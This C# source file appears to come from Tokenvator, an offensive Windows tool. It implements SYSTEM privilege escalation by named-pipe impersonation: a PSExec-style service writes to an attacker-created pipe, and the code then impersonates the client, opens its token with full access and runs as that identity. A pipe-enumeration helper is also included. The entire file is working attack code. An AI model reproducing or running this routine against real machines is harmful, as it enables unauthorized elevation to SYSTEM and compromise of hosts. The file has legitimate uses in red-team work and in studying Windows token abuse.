using System;
using System.ComponentModel;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

using Unmanaged.Headers;
using Unmanaged.Libraries;

namespace Tokenvator
{
    class NamedPipes
    {
        private static IntPtr hToken = IntPtr.Zero;
        private const String baseDirectory = @"\\.\pipe\";
        
        internal NamedPipes()
        {
            
        }

        internal static void GetSystem()
        {
            Thread thread = new Thread(() => GetPipeToken(@"\\.\pipe\Tokenvator"));
            using (PSExec psExec = new PSExec("Tokenvator"))
            {
                psExec.Connect(".");
                psExec.Create("%COMSPEC% /c echo tokenvator > \\\\.\\pipe\\Tokenvator");
                psExec.Open();
                thread.Start();
                psExec.Start();
                psExec.Stop();
            }
            
            thread.Join();
            if (IntPtr.Zero != hToken)
            {
                advapi32.ImpersonateLoggedOnUser(hToken);
                kernel32.CloseHandle(hToken);
                Console.WriteLine("[+] Operating as {0}", System.Security.Principal.WindowsIdentity.GetCurrent().Name);
            }
        }

        internal static Boolean GetPipeToken(String pipeName)
        {
            IntPtr hNamedPipe = kernel32.CreateNamedPipeA(pipeName, Winbase.OPEN_MODE.PIPE_ACCESS_DUPLEX, Winbase.PIPE_MODE.PIPE_TYPE_MESSAGE | Winbase.PIPE_MODE.PIPE_WAIT, 2, 0, 0, 0, IntPtr.Zero);
            if (IntPtr.Zero == hNamedPipe)
            {
                Console.WriteLine("[-] CreateNamedPipeA Failed");
                Console.WriteLine(new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return false;
            }
            Console.WriteLine("[+] Created Pipe {0}", pipeName);

            if (!kernel32.ConnectNamedPipe(hNamedPipe, IntPtr.Zero))
            {
                Console.WriteLine("[-] ConnectNamedPipe Failed");
                Console.WriteLine(new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return false;
            }
            Console.WriteLine("[+] Connected to Pipe {0}", pipeName);

            Byte[] lpBuffer = new Byte[128];
            UInt32 lpNumberOfBytesRead = 0;
            if (!kernel32.ReadFile(hNamedPipe, lpBuffer, 1, ref lpNumberOfBytesRead, IntPtr.Zero))
            {
                Console.WriteLine("[-] ReadFile Failed");
                Console.WriteLine(new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return false;
            }
            Console.WriteLine("[+] Read Pipe {0}", pipeName);

            if (!advapi32.ImpersonateNamedPipeClient(hNamedPipe))
            {
                Console.WriteLine("[-] ImpersonateNamedPipeClient Failed");
                Console.WriteLine(new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return false;
            }
            
            if (!kernel32.OpenThreadToken(kernel32.GetCurrentThread(), Constants.TOKEN_ALL_ACCESS, false, ref hToken))
            {
                Console.WriteLine("[-] OpenThreadToken Failed");
                Console.WriteLine(new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return false;
            }

            kernel32.DisconnectNamedPipe(hNamedPipe);
            kernel32.CloseHandle(hNamedPipe);

            return true;
        }

        internal static void EnumeratePipes()
        {
            String[] pipes = Directory.GetFiles(baseDirectory);
            foreach (String pipe in pipes)
            {
                Console.WriteLine(pipe);
            }
        }
    }
}
